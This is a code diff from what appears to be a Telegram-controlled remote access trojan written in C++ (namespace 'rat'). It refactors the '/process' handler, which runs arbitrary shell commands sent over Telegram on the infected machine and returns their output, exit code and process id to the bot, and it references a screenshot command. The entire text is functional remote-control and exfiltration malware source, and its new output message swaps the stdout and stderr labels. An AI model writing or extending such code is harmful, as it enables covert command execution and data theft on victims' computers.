@@ -13,8 +13,8 @@
 #include <string>
 #include <boost/algorithm/string.hpp>
 #include <memory>
-#include "rat/process.hpp"
 
+#include "rat/ProcessManager.hpp"
 #include "rat/handler/debug.hpp"
 
 
@@ -92,62 +92,69 @@ void Handler::handleScreenshotCommand() {
 
 void Handler::parseAndHandleProcessCommand() {
     std::string message_text = this->telegram_update->message.text;
-    if (message_text.size() <= 9) return;
-    message_text.erase(0, 9); // remove "/process "
+    if (message_text.size() <= 9) return;          // Not enough length for "/process "
+    message_text.erase(0, 9);                      // Remove "/process "
     boost::trim(message_text);
 
-    size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
+    // Find first space to separate timeout and command
+    const size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
     if (space_pos == std::string::npos) {
         this->bot->sendMessage("Invalid command format");
         return;
     }
 
     std::string timeout_str = message_text.substr(0, space_pos);
-    message_text.erase(0, space_pos);
+    message_text.erase(0, space_pos);              // Remove the timeout part
     boost::trim(message_text);
 
-    int timeout = 0;
+    int timeout_ms = 0;
     try {
-        timeout = std::stoi(timeout_str);
-        if (timeout < 0) throw std::invalid_argument("negative");
+        timeout_ms = std::stoi(timeout_str);
+        if (timeout_ms < 0) throw std::invalid_argument("negative timeout");
     } catch (...) {
         this->bot->sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
         return;
     }
-    ::rat::threading::ThreadPool* p_process_pool; 
-    if (timeout > 4000 || this->short_process_pool->getPendingWorkersCount() > 1) {
-      
-        p_process_pool = this->long_process_pool.get(); 
-    }else {
+
+    // Choose thread pool based on timeout and pending workers
+    ::rat::threading::ThreadPool* p_process_pool = nullptr;
+    if (timeout_ms > 4000 || this->short_process_pool->getPendingWorkersCount() > 1) {
+        p_process_pool = this->long_process_pool.get();
+    } else {
         p_process_pool = this->short_process_pool.get();
     }
-    auto process_lambda = [this](std::optional<::rat::process::ProcessResult> result) {
-            std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
-            if (result) {
-                this->backing_bot->sendMessage(
-                fmt::format("Exit: {}\nSTDOUT:\nSTDERR:{}", result->exit_code, result->stdout_str, result->stderr_str)
-              );
-            } else {
-                this->backing_bot->sendMessage(fmt::format("Process timed out or failed\n STDERR:{}", result->stderr_str));
-            }
-        };
- 
-    ::rat::process::ProcessContext process_context = {
-        .command = message_text,
-        .timeout = std::chrono::milliseconds(timeout),
-        .thread_pool = p_process_pool, // Assuming you have a thread_pool member
-        .mutexes    =  std::nullopt,  // Assuming you have a vector of mutexes
-        .secondary_thread_pool = this->secondary_helper_pool.get(),
-        .callback = process_lambda
-    };
-    std::atomic<pid_t> process_id{-1};
-    ::rat::process::runAsyncProcess(process_context, process_id);
-    if(process_id.load() != -1) {
-        this->bot->sendMessage(fmt::format("Process launched pid={}", process_id.load()));
-    }
 
-}
+    // Create and configure ProcessManager
+    auto process_manager_Sptr = std::make_shared<::rat::process::ProcessManager>();
+
+    process_manager_Sptr->setCommand(message_text);
+    process_manager_Sptr->setSecondaryThreadPool(this->secondary_helper_pool.get());
+    process_manager_Sptr->setTimeout(std::chrono::milliseconds(timeout_ms));
+
+    //std::vector<std::mutex*> mutexes_ptrs = { &this->backing_bot_mutex };
+    //process_manager.setMutexes(std::move(mutexes_ptrs));
+
+    process_manager_Sptr->setProcessCreationCallback([this, process_manager_Sptr](pid_t pid){
+        std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
+        this->backing_bot->sendMessage(fmt::format("Process launched with id {}", pid));
+    });
+
+    p_process_pool->enqueue([this, process_manager_Sptr]() {
+        process_manager_Sptr->execute();
+
+        std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
+        this->backing_bot->sendMessage(fmt::format(
+            "exit code:{}\nstderr:{}\nstdout:{}",
+            process_manager_Sptr->getExitCode(),
+            process_manager_Sptr->stdout_str,
+            process_manager_Sptr->stderr_str )
+        );
+    });
+    return;
+  }
+
 }//namespace rat::handler
+ //
 
 #undef DEBUG_LOG
 #undef ERROR_LOG
